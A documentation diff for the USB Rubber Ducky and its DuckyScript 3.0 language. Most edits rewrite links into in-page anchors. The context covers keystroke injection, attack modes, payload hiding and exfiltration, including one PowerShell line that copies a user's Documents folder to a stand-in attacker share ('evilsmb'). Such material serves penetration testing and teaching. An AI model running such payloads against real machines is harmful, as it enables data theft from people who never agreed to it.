@@ -157,12 +157,12 @@ It will not however show up as a mass storage "*flash drive*" — so you may be 
 
 ##### Press the button
 
-By default, if no other [`BUTTON_DEF`](/hak5-usb-rubber-ducky/button/wait_for_button_press.md) is defined, pressing the button during or after payload execution will cause the USB Rubber Ducky to execute "[`ATTACKMODE STORAGE`](/hak5-usb-rubber-ducky/attack-modes-constants-and-variables/attack-modes.md)" — which is essentially "arming mode" (re-connect to the computer as a regular ol' flash drive).
+By default, if no other [`BUTTON_DEF`](#wait_for_button_press) is defined, pressing the button during or after payload execution will cause the USB Rubber Ducky to execute "`ATTACKMODE STORAGE`" — which is essentially "arming mode" (re-connect to the computer as a regular ol' flash drive).
 
 > [!CAUTION]
 > Only press the button **after** inserting the USB Rubber Ducky. Pressing or holding the button *while inserting* the device <mark>will not result in arming mode (ATTACKMODE STORAGE).</mark>
 
-You'll absolutely want to familiarize yourself with the chapter on [The Button](/hak5-usb-rubber-ducky/button/wait_for_button_press.md), as well as [Attack Modes](/hak5-usb-rubber-ducky/attack-modes-constants-and-variables/attack-modes.md) to make the best use of DuckyScript 3.0 — but if you just want to jump into trying out payloads, this is handy to know.
+You'll absolutely want to familiarize yourself with the chapter on [The Button](#wait_for_button_press), as well as Attack Modes to make the best use of DuckyScript 3.0 — but if you just want to jump into trying out payloads, this is handy to know.
 
 While you can always get to the filesystem of the USB Rubber Ducky by removing the MicroSD card and using a card reader, knowing this important nuance of the new USB Rubber Ducky design will save you *a lot of time* in development. You may even consider adding a convenient `ATTACKMODE HID STORAGE` to the beginning of your payloads, or even just `ATTACKMODE STORAGE` followed by `WAIT_FOR_BUTTON_PRESS` before going into a HID attack using `ATTACKMODE HID` — just to keep access convenient.
 
@@ -237,10 +237,10 @@ These docs, or the e-book that's generated from it, contain the entire DuckyScri
 
 ##### Crash Course
 
-If you're looking to run your first payload right away and just want a crash course on the absolute bare bone basics to simply inject keystrokes, you can skip to [Hello, World!](/hak5-usb-rubber-ducky/ducky-script-basics/hello-world.md) (which teaches classic DuckyScript in one example) along with familiarizing yourself with [The Button](/hak5-usb-rubber-ducky/button/wait_for_button_press.md) we mentioned earlier (hello convenient arming mode!) and the subtleties of [Attack Modes](/hak5-usb-rubber-ducky/attack-modes-constants-and-variables/attack-modes.md).
+If you're looking to run your first payload right away and just want a crash course on the absolute bare bone basics to simply inject keystrokes, you can skip to Hello, World! (which teaches classic DuckyScript in one example) along with familiarizing yourself with [The Button](#wait_for_button_press) we mentioned earlier (hello convenient arming mode!) and the subtleties of Attack Modes.
 
 > [!NOTE]
-> Read more about the [**payload development workflow here**](/hak5-usb-rubber-ducky/ducky-script-basics/hello-world.md#testing-your-payload)
+> Read more about the [**payload development workflow here**](#testing-your-payload)
 
 ##### Classic Payloads
 
@@ -300,9 +300,9 @@ Contribute and browse payloads on GitHub
 Take your DuckyScript™ payloads to the next level with this full-featured, web-based development environment.
 
 
-#### [Comments](/hak5-usb-rubber-ducky/ducky-script-basics/rem.md)
+#### [Comments](#rem)
 
-##### [`REM`](/hak5-usb-rubber-ducky/ducky-script-basics/rem.md#rem)
+##### [`REM`](#rem)
 
 The `REM` command does not perform any keystroke injection functions. `REM` gets its name from the word remark. While `REM` may be used to add vertical spacing within a payload, blank lines are also acceptable and will not be processed by the compiler.
 
@@ -310,7 +310,7 @@ The `REM` command does not perform any keystroke injection functions. `REM` gets
 REM This is a comment
 ```
 
-##### [`REM_BLOCK`](/hak5-usb-rubber-ducky/ducky-script-basics/rem.md#rem_block)
+##### [`REM_BLOCK`](#rem_block)
 
 Defining a comment block is simple! Start the comment with `REM_BLOCK` and end the comment with `END_REM`; everything in between will be considered a comment without the need to prepend every new line with `REM`. Comment blocks can be especially useful when you have multiple lines to be included in a single comment or want to retain formatting.
 
@@ -326,9 +326,9 @@ REM_BLOCK DOCUMENTATION
 END_REM
 ```
 
-#### [Keystroke Injection](/hak5-usb-rubber-ducky/ducky-script-basics/keystroke-injection.md)
+#### [Keystroke Injection](#keystroke-injection)
 
-##### [`STRING`](/hak5-usb-rubber-ducky/ducky-script-basics/keystroke-injection.md#string)
+##### [`STRING`](#string)
 
 The `STRING` command keystroke injects (types) a series of keystrokes. `STRING` will automatically interpret uppercase letters by holding the `SHIFT` modifier key where necessary. The `STRING` command will also automatically press the SPACE cursor key, however trailing spaces will be omitted.
 
@@ -336,7 +336,7 @@ The `STRING` command keystroke injects (types) a series of keystrokes. `STRING` 
 STRING The quick brown fox jumps over the lazy dog
 ```
 
-##### [`STRINGLN`](/hak5-usb-rubber-ducky/ducky-script-basics/keystroke-injection.md#stringln)
+##### [`STRINGLN`](#stringln)
 
 The `STRINGLN` command, like `STRING`, will inject a series of keystrokes then terminate with a carriage return (`ENTER`).
 
@@ -346,9 +346,9 @@ STRINGLN   __(.)< __(.)> __(.)=   Rubber   >(.)__ <(.)__ =(.)__
 STRINGLN   \___)  \___)  \___)    Ducky!    (___/  (___/  (___/
 ```
 
-##### [`STRING Blocks`](/hak5-usb-rubber-ducky/ducky-script-basics/keystroke-injection.md#string-and-stringln-blocks)
+##### [`STRING Blocks`](#keystroke-injection)
 
-###### [`STRING Blocks`](/hak5-usb-rubber-ducky/ducky-script-basics/keystroke-injection.md#string-blocks)
+###### [`STRING Blocks`](#string-blocks)
 
 `STRING` blocks can be used effectively to convert multiple lines into one without needing to prepend each line with `STRING`
 
@@ -373,7 +373,7 @@ STRING c
 
 Or in this case: `STRING abc`
 
-###### &#x20;[`STRINGLN Blocks`](/hak5-usb-rubber-ducky/ducky-script-basics/keystroke-injection.md#stringln-blocks)
+###### &#x20;[`STRINGLN Blocks`](#stringln-blocks)
 
 `STRINGLN` blocks can be used like [here-doc](https://en.wikipedia.org/wiki/Here_document); allowing you to inject multiple lines **as they are written in the payload.**&#x20;
 
@@ -406,7 +406,7 @@ b
 c
 ```
 
-##### [Cursor Keys](/hak5-usb-rubber-ducky/ducky-script-basics/keystroke-injection.md#cursor-keys)
+##### [Cursor Keys](#cursor-keys)
 
 The cursor keys are used to navigate the cursor to a different position on the screen.
 
@@ -422,7 +422,7 @@ The cursor keys are used to navigate the cursor to a different position on the s
 >
 > `SPACE`
 
-##### [System Keys ](/hak5-usb-rubber-ducky/ducky-script-basics/keystroke-injection.md#system-keys)
+##### [System Keys ](#system-keys)
 
 System keys are primarily used by the operating system for special functions and may be used to interact with both text areas and navigating the user interface.
 
@@ -438,7 +438,7 @@ System keys are primarily used by the operating system for special functions and
 >
 > `F1` `F2` `F3` `F4` `F5` `F6` `F7` `F8` `F9` `F0` `F11` `F12`
 
-##### [Basic Modifier Keys](/hak5-usb-rubber-ducky/ducky-script-basics/keystroke-injection.md#basic-modifier-keys)
+##### [Basic Modifier Keys](#basic-modifier-keys)
 
 Modifier keys held in combination with another key to perform a special function. Common keyboard combinations for the PC include the familiar `CTRL c` for copy, `CTRL x` for cut, and `CTRL v` for paste.&#x20;
 
@@ -462,7 +462,7 @@ REM Close the window
 ALT F4
 ```
 
-##### [Key and Modifier Combos](/hak5-usb-rubber-ducky/ducky-script-basics/keystroke-injection.md#key-and-modifier-combos)
+##### [Key and Modifier Combos](#key-and-modifier-combos)
 
 In addition to the basic modifier key combinations, such as `CTRL c`, modifiers and keys may be combined arbitrarily.
 
@@ -484,7 +484,7 @@ In addition to the basic modifier key combinations, such as `CTRL c`, modifiers 
 CTRL ALT DELETE
 ```
 
-##### [Standalone Modifier Keys](/hak5-usb-rubber-ducky/ducky-script-basics/keystroke-injection.md#standalone-modifier-keys)
+##### [Standalone Modifier Keys](#standalone-modifier-keys)
 
 Injecting a modifier key alone without another key — such as pressing the `WINDOWS` key — may be achieved by prepending the modifier key with the `INJECT_MOD` command.
 
@@ -494,7 +494,7 @@ REM Example pressing Windows key alone
 INJECT_MOD WINDOWS
 ```
 
-##### [Lock Keys](/hak5-usb-rubber-ducky/ducky-script-basics/keystroke-injection.md#lock-keys)
+##### [Lock Keys](#lock-keys)
 
 Lock keys toggle the lock state (on or off) and typically change the interpretation of subsequent keypresses. For example, caps lock generally makes all subsequent letter keys appear in uppercase.
 
@@ -504,9 +504,9 @@ Lock keys toggle the lock state (on or off) and typically change the interpretat
 >
 > `SCROLLOCK`
 
-#### [Delays](/hak5-usb-rubber-ducky/ducky-script-basics/delay.md)
+#### [Delays](#delay)
 
-##### [`DELAY`](/hak5-usb-rubber-ducky/ducky-script-basics/delay.md#delay)
+##### [`DELAY`](#delay)
 
 The `DELAY` command instructs the USB Rubber Ducky to momentarily pause execution of the payload. This is useful when deploying a payload which must "wait" for an element — such as a window — to load. The `DELAY` command accepts the time parameter in milliseconds.
 
@@ -528,11 +528,11 @@ DELAY $WAIT
 > [!WARNING]
 > `DELAY` timings might differ slightly depending on the `ATTACKMODE` the USB Rubber Ducky is in when executing the `DELAY` and depending on the target host.
 
-#### [The Button](/hak5-usb-rubber-ducky/button/wait_for_button_press.md)
+#### [The Button](#wait_for_button_press)
 
 By default, if no other button command is currently in use, pressing the button during payload execution will make the USB Rubber Ducky stop any further keystroke injection. It will then become an ordinary USB flash drive, commonly referred to as "arming mode".
 
-##### [`WAIT_FOR_BUTTON_PRESS`](/hak5-usb-rubber-ducky/button/wait_for_button_press.md#wait_for_button_press)
+##### [`WAIT_FOR_BUTTON_PRESS`](#wait_for_button_press)
 
 Halts payload execution until a button press is detected. When this command is reached in the payload, no further execution will occur.
 
@@ -542,7 +542,7 @@ WAIT_FOR_BUTTON_PRESS
 STRING The button was pressed!
 ```
 
-##### [`BUTTON_DEF`](/hak5-usb-rubber-ducky/button/wait_for_button_press.md#button_def)
+##### [`BUTTON_DEF`](#button_def)
 
 The `BUTTON_DEF` command defines a function which will execute when the button is pressed anytime within the payload so long as the button control is not already in use by the `WAIT_FOR_BUTTON_PRESS` command or other such function.
 
@@ -555,31 +555,31 @@ STRINGLN Press the button with the next 10 seconds
 DELAY 10000
 ```
 
-##### [`DISABLE_BUTTON`](/hak5-usb-rubber-ducky/button/wait_for_button_press.md#disable_button)
+##### [`DISABLE_BUTTON`](#disable_button)
 
 The `DISABLE_BUTTON` command prevents the button from calling the `BUTTON_DEF`.&#x20;
 
-##### [`ENABLE_BUTTON`](/hak5-usb-rubber-ducky/button/wait_for_button_press.md#enable_button)
+##### [`ENABLE_BUTTON`](#enable_button)
 
 The `ENABLE_BUTTON` command allows pressing the button to call the `BUTTON_DEF`.&#x20;
 
-#### [The LED](/hak5-usb-rubber-ducky/button/led.md)
+#### The LED
 
 The USB Rubber Ducky includes an LED which may be helpful when deploying certain payloads where feedback is important.
 
-##### [`LED_OFF`](/hak5-usb-rubber-ducky/button/led.md#led_off)
+##### [`LED_OFF`](#led_off)
 
 The `LED_OFF` command will disable all LED modes.
 
-##### [`LED_R`](/hak5-usb-rubber-ducky/button/led.md#led_r)
+##### [`LED_R`](#led_r)
 
 The `LED_R` command will enable the red LED.
 
-##### [`LED_G`](/hak5-usb-rubber-ducky/button/led.md#led_g)
+##### [`LED_G`](#led_g)
 
 The `LED_G` command will enable the green LED.
 
-#### [ATTACKMODE](/hak5-usb-rubber-ducky/attack-modes-constants-and-variables/attack-modes.md)
+#### ATTACKMODE
 
 An attack mode is the device type that a USB Rubber Ducky, is functioning as or emulating. If no `ATTACKMODE` command is specified as the first command (excluding `REM`), the `HID` attack mode will execute, allowing the device to function as a keyboard. The `ATTACKMODE` command may be run multiple times within a payload, which may cause the device to be re-enumerated by the target if the attack mode changes.
 
@@ -620,11 +620,11 @@ REM  - Product: DUCKY
 REM  - Serial: 1337
 ```
 
-##### [`SAVE_ATTACKMODE`](/hak5-usb-rubber-ducky/attack-modes-constants-and-variables/attack-modes.md#save_attackmode)
+##### [`SAVE_ATTACKMODE`](#save_attackmode)
 
 The `SAVE_ATTACKMODE` command will save the currently running `ATTACKMODE` state (including any specified `VID`, `PID`, `MAN`, `PROD` and `SERIAL` parameters) such that it may be later restored.
 
-##### [`RESTORE_ATTACKMODE`](/hak5-usb-rubber-ducky/attack-modes-constants-and-variables/attack-modes.md#restore_attackmode)
+##### [`RESTORE_ATTACKMODE`](#restore_attackmode)
 
 The `RESTORE_ATTACKMODE` command will restore a previously saved `ATTACKMODE` state.
 
@@ -640,9 +640,9 @@ DELAY 2000
 STRING , World!
 ```
 
-#### [Constants](/hak5-usb-rubber-ducky/attack-modes-constants-and-variables/constants.md)
+#### [Constants](#constants)
 
-##### [`DEFINE`](/hak5-usb-rubber-ducky/attack-modes-constants-and-variables/constants.md#define)
+##### [`DEFINE`](#define)
 
 The `DEFINE` command is used to define a constant. One may consider the use of a `DEFINE` within a payload like a find-and-replace at time of compile.
 
@@ -655,9 +655,9 @@ STRINGLN #TEXT
 STRING https://#MYURL
 ```
 
-#### [Variables](/hak5-usb-rubber-ducky/attack-modes-constants-and-variables/variables.md)
+#### [Variables](#variables)
 
-##### [`VAR`](/hak5-usb-rubber-ducky/attack-modes-constants-and-variables/variables.md#var)
+##### [`VAR`](#var)
 
 The `VAR` command will initiate a variable. Unlike constants, variables begin with a dollar sign ("`$`"). Variables contain unsigned integers with values from 0 to 65535. Booleans may be represented as well, either by `TRUE`/`FALE` or any non-zero number and `0` respectively.
 
@@ -666,11 +666,11 @@ VAR $BLINK = TRUE
 VAR $BLINK_TIME = 1000
 ```
 
-#### [Operators](/hak5-usb-rubber-ducky/operators-conditions-loops-and-functions/operators.md)
+#### [Operators](#operators)
 
 Operators instruct the payload to perform a given mathematical, relational or logical operation.
 
-##### [Math](/hak5-usb-rubber-ducky/operators-conditions-loops-and-functions/operators.md#math-operators)
+##### [Math](#math-operators)
 
 <table><thead><tr><th width="150">Operator</th><th width="150">Meaning</th></tr></thead><tbody><tr><td>=</td><td>Assignment</td></tr><tr><td>+</td><td>Add</td></tr><tr><td>-</td><td>Subtract</td></tr><tr><td>*</td><td>Multiply</td></tr><tr><td>/</td><td>Divide</td></tr><tr><td>%</td><td>Modulus</td></tr><tr><td>^</td><td>Exponent</td></tr></tbody></table>
 
@@ -680,7 +680,7 @@ $FOO = ( $FOO - 1295 )
 REM $FOO was assigned 1337, subtracted 1295, and ended up equalling 42.
 ```
 
-##### [Comparison](/hak5-usb-rubber-ducky/operators-conditions-loops-and-functions/operators.md#comparison-operators)
+##### [Comparison](#comparison-operators)
 
 Will compare two values to evaluate a single boolean value.
 
@@ -694,7 +694,7 @@ IF ( $FOO < $BAR ) THEN
 END_IF
 ```
 
-##### [Order of Operations](/hak5-usb-rubber-ducky/operators-conditions-loops-and-functions/operators.md#order-of-operations)
+##### [Order of Operations](#order-of-operations)
 
 Parentheses `( )` are required to define the precedence conventions.
 
@@ -703,7 +703,7 @@ VAR $FOO = 42
 VAR $BAR = (( 100 * 13 ) + ( $FOO - 5 ))
 ```
 
-##### [Logical Operators](/hak5-usb-rubber-ducky/operators-conditions-loops-and-functions/operators.md#logical-operators)
+##### [Logical Operators](#logical-operators)
 
 Logical operators may be used to connect two or more expressions.
 
@@ -717,7 +717,7 @@ IF ( $FOO < $BAR ) || ( $BAR == $FOO ) THEN
 END_IF
 ```
 
-##### [Augmented Assignment](/hak5-usb-rubber-ducky/operators-conditions-loops-and-functions/operators.md#augmented-assignment-operators)
+##### [Augmented Assignment](#augmented-assignment-operators)
 
 When assigning a value to a variable, the variable itself may be referenced.
 
@@ -726,7 +726,7 @@ VAR $FOO = 1336
 VAR $FOO = ( $FOO + 1 )
 ```
 
-##### [Bitwise Operators](/hak5-usb-rubber-ducky/operators-conditions-loops-and-functions/operators.md#bitwise-operators)
+##### [Bitwise Operators](#bitwise-operators)
 
 Operate on the uint16 values at the binary level.
 
@@ -740,11 +740,11 @@ $FOO = ((($FOO >> 8) & 0x00FF) | (($FOO << 8) & 0xFF00))
 REM $FOO will now equal 0xAC05
 ```
 
-#### [Conditional Statements](/hak5-usb-rubber-ducky/operators-conditions-loops-and-functions/conditional-statements.md)
+#### [Conditional Statements](#conditional-statements)
 
 Conditional statements, loops and functions allow for dynamic execution.
 
-##### [`IF`](/hak5-usb-rubber-ducky/operators-conditions-loops-and-functions/conditional-statements.md#if)
+##### [`IF`](#if)
 
 The flow control statement `IF` will determine whether or not to execute its block of code based on the evaluation of an expression. One way to interpret an `IF` statement is to read it as "`IF` this condition is true, `THEN` do this".
 
@@ -756,7 +756,7 @@ IF ( $FOO < $BAR ) THEN
 END_IF
 ```
 
-##### [`ELSE`](/hak5-usb-rubber-ducky/operators-conditions-loops-and-functions/conditional-statements.md#else)
+##### [`ELSE`](#else)
 
 The `ELSE` statement is an optional component of the `IF` statement which will only execute when the `IF` statement condition is `FALSE`.
 
@@ -768,11 +768,11 @@ ELSE IF ( $_CAPSLOCK_ON == FALSE ) THEN
 END_IF
 ```
 
-#### [Loops](/hak5-usb-rubber-ducky/operators-conditions-loops-and-functions/loops.md)
+#### [Loops](#loops)
 
 Loops are flow control statements that can be used to repeat instructions until a specific condition is reached.
 
-##### [`WHILE`](/hak5-usb-rubber-ducky/operators-conditions-loops-and-functions/loops.md#while)
+##### [`WHILE`](#while)
 
 The block of code within the `WHILE` statement will continue to repeatedly execute for a number of times (called iterations) for as long as the condition of the `WHILE` statement is `TRUE`.&#x20;
 
@@ -788,11 +788,11 @@ WHILE TRUE
 END_WHILE
 ```
 
-#### [Functions](/hak5-usb-rubber-ducky/operators-conditions-loops-and-functions/functions.md)
+#### [Functions](#functions)
 
 Functions are blocks of organized single-task code that let you more efficiently run the same code multiple times without the need to copy and paste large blocks of code over and over again.&#x20;
 
-##### [`FUNCTION`](/hak5-usb-rubber-ducky/operators-conditions-loops-and-functions/functions.md#function)
+##### [`FUNCTION`](#function)
 
 ```
 REM Types "Hello.....World!"
@@ -811,7 +811,7 @@ COUNTDOWN()
 STRING World!
 ```
 
-##### [`RETURN`](/hak5-usb-rubber-ducky/operators-conditions-loops-and-functions/functions.md#return-values)
+##### [`RETURN`](#return-values)
 
 A function may return a integer or boolean value which may also be evaluated.
 
@@ -829,11 +829,11 @@ IF (TEST_CAPS_AND_NUM() == TRUE) THEN
 END_IF
 ```
 
-#### [Randomization](/hak5-usb-rubber-ducky/advanced-features/randomization.md)
+#### [Randomization](#randomization)
 
 The pseudorandom number generator provides randomization for keystroke injection, variables and attackmode parameters. The first time a randomization feature is used, a `seed.bin` will be generated on the root of the MicroSD card. One may also be generated from the [Hak5 IDE](https://encoder.hak5.org).
 
-##### [Random Keystroke Injection](/hak5-usb-rubber-ducky/advanced-features/randomization.md#random-keystroke-injection)
+##### [Random Keystroke Injection](#random-keystroke-injection)
 
 <table><thead><tr><th width="150">Command</th><th>Character Set</th></tr></thead><tbody><tr><td><code>RANDOM_LOWERCASE_LETTER</code></td><td><code>abcdefghijklmnopqrstuvwxyz</code></td></tr><tr><td><code>RANDOM_UPPERCASE_LETTER</code></td><td><code>ABCDEFGHIJKLMNOPQRSTUVWXYZ</code></td></tr><tr><td><code>RANDOM_LETTER</code></td><td><code>abcdefghijklmnopqrstuvwxyz<br />ABCDEFGHIJKLMNOPQRSTUVWXYZ</code></td></tr><tr><td><code>RANDOM_NUMBER</code></td><td><code>0123456789</code></td></tr><tr><td><code>RANDOM_SPECIAL</code></td><td><code>!@#$%^&#x26;&#42;()</code></td></tr><tr><td><code>RANDOM_CHAR</code></td><td><code>abcdefghijklmnopqrstuvwxyz ABCDEFGHIJKLMNOPQRSTUVWXYZ<br />0123456789<br />!@#$%^&#x26;&#42;()</code></td></tr></tbody></table>
 
@@ -846,7 +846,7 @@ WHILE ($COUNT > 0)
 END_WHILE
 ```
 
-##### [Random Integers](/hak5-usb-rubber-ducky/advanced-features/randomization.md#random-integers)
+##### [Random Integers](#random-integers)
 
 The internal variable `$_RANDOM_INT` assigns a random integer between the specified `$_RANDOM_MIN` and `$_RANDOM_MAX` values. May be 0-65535. The default values are `0-9`.&#x20;
 
@@ -858,7 +858,7 @@ VAR $FOO = $_RANDOM_INT
 REM The variable $FOO will be between 42 and 1337
 ```
 
-##### [Random and ATTACKMODE](/hak5-usb-rubber-ducky/advanced-features/randomization.md#random-and-attackmode)
+##### [Random and ATTACKMODE](#random-and-attackmode)
 
 The `ATTACKMODE` command may accept random values for the optional parameters.
 
@@ -877,9 +877,9 @@ ATTACKMODE HID VID_RANDOM PID_RANDOM MAN_RANDOM PROD_RANDOM SERIAL_RANDOM
 > [!CAUTION]
 > Use caution when using random `VID` and `PID` values as unexpected results are likely.
 
-#### [Holding Keys](/hak5-usb-rubber-ducky/advanced-features/holding-keys.md)
+#### [Holding Keys](#holding-keys)
 
-A key may be held, rather than pressed, by specifying a `HOLD` and `RELEASE` command with a `DELAY` in between the two. Both `HOLD` and `RELEASE` must specify a key. [Multiple simultaneous keys](/hak5-usb-rubber-ducky/advanced-features/holding-keys.md#holding-multiple-keys) may be held.
+A key may be held, rather than pressed, by specifying a `HOLD` and `RELEASE` command with a `DELAY` in between the two. Both `HOLD` and `RELEASE` must specify a key. [Multiple simultaneous keys](#holding-multiple-keys) may be held.
 
 ```
 HOLD a
@@ -898,23 +898,23 @@ REM Will hold the Windows key for 4 seconds. Note the use of INJECT_MOD
 REM when using a modifier key without a key combination.
 ```
 
-#### [Payload Control](/hak5-usb-rubber-ducky/advanced-features/payload-control.md)
+#### [Payload Control](#payload-control)
 
 These simple commands exist to control the execution of a payload.
 
-##### [`RESTART_PAYLOAD`](/hak5-usb-rubber-ducky/advanced-features/payload-control.md#restart_payload)
+##### [`RESTART_PAYLOAD`](#restart_payload)
 
 The `RESTART_PAYLOAD` command ceases execution, restarting the payload from the beginning.
 
-##### [STOP\_PAYLOAD](/hak5-usb-rubber-ducky/advanced-features/payload-control.md#stop_payload)
+##### [STOP\_PAYLOAD](#stop_payload)
 
 The `STOP_PAYLOAD` command ceases and further execution.
 
-##### [RESET](/hak5-usb-rubber-ducky/advanced-features/payload-control.md#reset)
+##### [RESET](#reset)
 
 The `RESET` command clears the keystroke buffer, useful for debugging complex hold key states.
 
-#### [Jitter](/hak5-usb-rubber-ducky/advanced-features/jitter.md)
+#### [Jitter](#jitter)
 
 Jitter randomly varies the delay between individual key presses based on the `seed.bin` value.
 
@@ -929,15 +929,15 @@ $_JITTER_ENABLED = TRUE
 STRINGLN The quick brown fox jumps over the lazy dog
 ```
 
-#### [Payload Hiding](/hak5-usb-rubber-ducky/advanced-features/payload-hiding.md)
+#### [Payload Hiding](#payload-hiding)
 
 The `inject.bin` and `seed.bin` file may be hidden from the MicroSD card before implementing `ATTACKMODE STORAGE`. The `HIDE_PAYLOAD` and `RESTORE_PAYLOAD` commands must be run while using `ATTACKMODE OFF` or `ATTACKMODE HID`.
 
-##### [`HIDE_PAYLOAD`](/hak5-usb-rubber-ducky/advanced-features/payload-hiding.md#hide_payload-and-restore_payload)
+##### [`HIDE_PAYLOAD`](#hide_payload-and-restore_payload)
 
 Hides the inject.bin and seed.bin files from the MicroSD card.
 
-##### [`RESTORE_PAYLOAD`](/hak5-usb-rubber-ducky/advanced-features/payload-hiding.md#hide_payload-and-restore_payload)
+##### [`RESTORE_PAYLOAD`](#hide_payload-and-restore_payload)
 
 Restores the inject.bin and seed.bin files to the MicroSD card.
 
@@ -956,11 +956,11 @@ DELAY 2000
 STRINGLN The payload files have been restored.
 ```
 
-#### [Lock Keys](/hak5-usb-rubber-ducky/advanced-features/lock-keys.md)
+#### [Lock Keys](#lock-keys)
 
 USB HID devices contain both IN endpoints for data (keystrokes) from the keyboard to computer, and OUT endpoints for data (LED states) from the computer to the keyboard. In many cases the LED state control codes sent from the computer to the attached keyboard are sent to all attached "keyboards". Versions of macOS behave differently.
 
-##### [`WAIT_FOR` Commands](/hak5-usb-rubber-ducky/advanced-features/lock-keys.md#wait_for-commands)
+##### [`WAIT_FOR` Commands](#wait_for-commands)
 
 <table><thead><tr><th width="215.30856153454425">Command</th><th>Description</th></tr></thead><tbody><tr><td><code>WAIT_FOR_CAPS_ON</code></td><td>Pause until caps lock is turned on</td></tr><tr><td><code>WAIT_FOR_CAPS_OFF</code></td><td>Pause until caps lock is turned off</td></tr><tr><td><code>WAIT_FOR_CAPS_CHANGE</code></td><td>Pause until caps lock is toggled on or off</td></tr><tr><td><code>WAIT_FOR_NUM_ON</code></td><td>Pause until num lock is turned on</td></tr><tr><td><code>WAIT_FOR_NUM_OFF</code></td><td>Pause until num lock is turned off</td></tr><tr><td><code>WAIT_FOR_NUM_CHANGE</code></td><td>Pause until num lock is toggled on or off</td></tr><tr><td><code>WAIT_FOR_SCROLL_ON</code></td><td>Pause until scroll lock is turned on</td></tr><tr><td><code>WAIT_FOR_SCROLL_OFF</code></td><td>Pause until scroll lock is turned off</td></tr><tr><td><code>WAIT_FOR_SCROLL_CHANGE</code></td><td>Pause until scroll lock is toggled on or off</td></tr></tbody></table>
 
@@ -971,7 +971,7 @@ WAIT_FOR_CAPS_CHANGE
 STRINGLN World!
 ```
 
-##### [`SAVE` and `RESTORE` Commands](/hak5-usb-rubber-ducky/advanced-features/lock-keys.md#save-and-restore-commands)
+##### [`SAVE` and `RESTORE` Commands](#save-and-restore-commands)
 
 The currently reported lock key states may be saved and later recalled using the `SAVE_HOST_KEYBOARD_LOCK_STATE` and `RESTORE_HOST_KEYBOARD_LOCK_STATE` commands.&#x20;
 
@@ -985,9 +985,9 @@ REM Restore the original lock states
 RESTORE_HOST_KEYBOARD_LOCK_STATE
 ```
 
-#### [Exfiltration](/hak5-usb-rubber-ducky/advanced-features/exfiltration.md)
+#### [Exfiltration](#exfiltration)
 
-Exfiltration is the unauthorized transfer of information from a system. Typically performed over a [physical medium](/hak5-usb-rubber-ducky/advanced-features/exfiltration.md#physical-medium-exfiltration) (copying to a USB flash disk such as the USB Rubber Ducky while using `ATTACKMODE STORAGE`) or a [network medium](/hak5-usb-rubber-ducky/advanced-features/exfiltration.md#network-medium-exfiltration) such as email, ftp, smb, http, etc.
+Exfiltration is the unauthorized transfer of information from a system. Typically performed over a [physical medium](#physical-medium-exfiltration) (copying to a USB flash disk such as the USB Rubber Ducky while using `ATTACKMODE STORAGE`) or a [network medium](#network-medium-exfiltration) such as email, ftp, smb, http, etc.
 
 ##### Physical Exfiltration Example
 
@@ -1010,11 +1010,11 @@ DELAY 100
 STRINGLN powershell "cp -r $env:USERPROFILE\Documents\* \\evilsmb\share"
 ```
 
-##### [Keystroke Reflection](/hak5-usb-rubber-ducky/advanced-features/exfiltration.md#the-keystroke-reflection-attack)
+##### [Keystroke Reflection](#the-keystroke-reflection-attack)
 
-By taking advantage of the [HID OUT endpoint](/hak5-usb-rubber-ducky/advanced-features/lock-keys.md#end-points-and-control-codes) as described in the [lock keys](/hak5-usb-rubber-ducky/advanced-features/lock-keys.md) section, binary data may be exfiltrated "out of band" using the Keystroke Reflection side-channel attack. This is done by using the `$_EXFIL_MODE_ENABLED` internal variable. The reflected lock keystrokes are saved to [`loot.bin`](/hak5-usb-rubber-ducky/advanced-features/exfiltration.md#working-with-loot) on the root of the MicroSD card. For a detailed example, see the section on [Keystroke Reflection](/hak5-usb-rubber-ducky/advanced-features/exfiltration.md#the-keystroke-reflection-attack).
+By taking advantage of the [HID OUT endpoint](#end-points-and-control-codes) as described in the [lock keys](#lock-keys) section, binary data may be exfiltrated "out of band" using the Keystroke Reflection side-channel attack. This is done by using the `$_EXFIL_MODE_ENABLED` internal variable. The reflected lock keystrokes are saved to [`loot.bin`](#working-with-loot) on the root of the MicroSD card. For a detailed example, see the section on [Keystroke Reflection](#the-keystroke-reflection-attack).
 
-##### [Variable Exfiltration](/hak5-usb-rubber-ducky/advanced-features/exfiltration.md#variable-exfiltration)
+##### [Variable Exfiltration](#variable-exfiltration)
 
 Similarly, arbitrary variable data may be saved to the `loot.bin` file using the `EXFIL` command.
 
@@ -1944,7 +1944,7 @@ The button on the USB Rubber Ducky can be used to control payload execution.&#x2
 By default, if no button definition (`BUTTON_DEF`) has yet been defined in the payload, pressing the button will invoke `ATTACKMODE STORAGE`. This will disable any further keystroke injection and effectively turning the USB Rubber Ducky into a mass storage flash drive, often referred to as "Arming Mode".
 
 > [!NOTE]
-> Confused on how to press the button **through** the case? You may have missed it in the [Quick Start guide](https://documentation.hak5.org/hak5-usb-rubber-ducky/button/pages/664HMsyQmxYt60eLxU6g#2.-mod-the-case-for-a-squeeze-to-press-button).
+> Confused on how to press the button **through** the case? You may have missed it in the Quick Start guide.
 
 #### WAIT\_FOR\_BUTTON\_PRESS
 
@@ -2375,7 +2375,7 @@ When `TRUE` the LED will blink green on payload execution.
 
 Default set `TRUE`. May be retrieved or set.
 
-When `TRUE` the LED will blink green during [Keystroke Reflection](/hak5-usb-rubber-ducky/advanced-features/exfiltration.md#the-keystroke-reflection-attack).
+When `TRUE` the LED will blink green during [Keystroke Reflection](#the-keystroke-reflection-attack).
 
 ##### $\_LED\_SHOW\_CAPS
 
@@ -2887,7 +2887,7 @@ In addition to comment blocks (like the `REM` title/author/description lines in 
 * Spaces cannot be used in naming a constant — however underscore makes for a suitable replacement. For example: `DEFINE #REMOTE_HOST 192.168.1.100`.
 * Labels should descriptive. For example, `#RHST` is better than `#R`, and `#REMOTE_HOST` is better than `#RHOST`.&#x20;
 * Be careful when using the uppercase letter `O` or lowercase letter `l` as they may be confused with the numbers `0` and `1`.
-* Avoid using the names of commands or internal variables (e.g. `ATTACKMODE`, `STRING`, `WINDOWS`, `MAC`, `$_BUTTON_ENABLED`). [See the full command and variable reference.](/hak5-usb-rubber-ducky/duckyscript-tm-quick-reference.md)
+* Avoid using the names of commands or internal variables (e.g. `ATTACKMODE`, `STRING`, `WINDOWS`, `MAC`, `$_BUTTON_ENABLED`). See the full command and variable reference.
 
 ##### Invalid Usages
 
@@ -2952,7 +2952,7 @@ VAR $BAR = 1337
 
 #### Internal Variables
 
